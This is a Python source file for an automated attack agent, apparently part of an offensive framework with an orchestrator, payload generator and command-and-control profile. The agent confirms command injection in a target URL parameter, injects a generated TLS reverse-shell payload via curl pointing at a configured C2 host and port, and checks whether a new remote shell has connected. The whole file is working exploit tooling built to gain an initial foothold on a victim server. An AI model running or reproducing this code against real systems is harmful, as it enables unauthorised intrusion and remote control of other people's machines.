from core.data_models import Strategy, CommandInjectionReport, CommandInjectionFinding, AttackPhase, PostExReport, ErrorType
from core.logger import log
from config import settings
import time
import os
import asyncio
from agents.payload_generator_agent import PayloadGeneratorAgent
from typing import Optional

from core.base_agent import BaseAgent


class CommandInjectionExploiter(BaseAgent):
    # Assuming AttackPhase enum is not available
    supported_phases = [AttackPhase.INITIAL_FOOTHOLD]
    required_tools = ["curl"]

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.sleep_duration = settings.COMMAND_INJECTION_SLEEP_DURATION
        self.payload_generator: Optional[PayloadGeneratorAgent] = None
        self.post_ex_report: Optional[PostExReport] = None
        self.c2_profile: Optional[dict] = None
        self.report_class = CommandInjectionReport # Set report class

    async def setup(self):
        """Asynchronous setup method for CommandInjectionExploiter."""
        self.payload_generator = await self.context_manager.get_context('payload_generator')
        self.post_ex_report = await self.context_manager.get_context('post_ex_report')
        self.c2_profile = await self.context_manager.get_context('c2_profile')

    async def run(self, strategy: Strategy, **kwargs) -> CommandInjectionReport:
        start_time = time.time()
        log.phase("Command Injection Agent: Starting scan...")

        target_url = strategy.context.get("url")
        param_to_test = strategy.context.get("param")

        if not target_url or not param_to_test:
            end_time = time.time()
            return CommandInjectionReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                summary="URL or parameter not specified in the strategy context.",
                errors=["Agent requires 'url' and 'param' in the context to run."],
                error_type=ErrorType.CONFIGURATION
            )

        # 1. Confirm vulnerability with time-based technique
        is_vulnerable = await self._confirm_vulnerability_time_based(target_url, param_to_test)
        if not is_vulnerable:
            end_time = time.time()
            return CommandInjectionReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                summary="Command injection vulnerability not confirmed.",
                errors=["Time-based vulnerability confirmation failed."],
                error_type=ErrorType.LOGIC
            )

        # 2. Generate and attempt reverse shell
        log.info(
            "Vulnerability confirmed. Generating dynamic payload and attempting TLS reverse shell...")
        os_type = self.post_ex_report.os_info if self.post_ex_report else "linux"
        user_agent = self.c2_profile.get(
            "user_agent", "Mozilla/5.0") if self.c2_profile else "Mozilla/5.0"

        payload = await self.payload_generator.run(os_type, settings.C2_HOST, settings.C2_PORT, user_agent)
        if not payload:
            end_time = time.time()
            return CommandInjectionReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                summary="Failed to generate reverse shell payload.",
                errors=["Payload generation failed."],
                error_type=ErrorType.LOGIC
            )

        exploit_command = f"curl -s \"{target_url}?{param_to_test}={payload}\""

        try:
            shells_before = self.orchestrator.shell_manager.list_shells()
            await self.orchestrator.run_shell_command(exploit_command, "Attempting reverse shell.")
            await asyncio.sleep(5)  # Wait for shell to connect

            shells_after = self.orchestrator.shell_manager.list_shells()

            new_shells = {k: v for k, v in shells_after.items()
                          if k not in shells_before}

            if new_shells:
                log.success("Reverse shell successful!")
                finding = CommandInjectionFinding(
                    vulnerable_url=target_url,
                    tool_used="dynamic_payload_tls",
                    command=exploit_command,
                    output=f"Successfully obtained reverse shell: {new_shells}"
                )
                end_time = time.time()
                return CommandInjectionReport(
                    agent_name=self.__class__.__name__,
                    start_time=start_time,
                    end_time=end_time,
                    findings=[finding],
                    summary="Reverse shell established.",
                    shell_id=list(new_shells.keys())[0]
                )
            else:
                log.warning("Reverse shell failed.")
                end_time = time.time()
                return CommandInjectionReport(
                    agent_name=self.__class__.__name__,
                    start_time=start_time,
                    end_time=end_time,
                    summary="Vulnerability confirmed, but reverse shell failed.",
                    errors=["Reverse shell failed to establish."],
                    error_type=ErrorType.NETWORK
                )
        except Exception as e:
            end_time = time.time()
            return CommandInjectionReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                summary=f"Error during exploit attempt: {e}",
                errors=[str(e)],
                error_type=ErrorType.LOGIC
            )
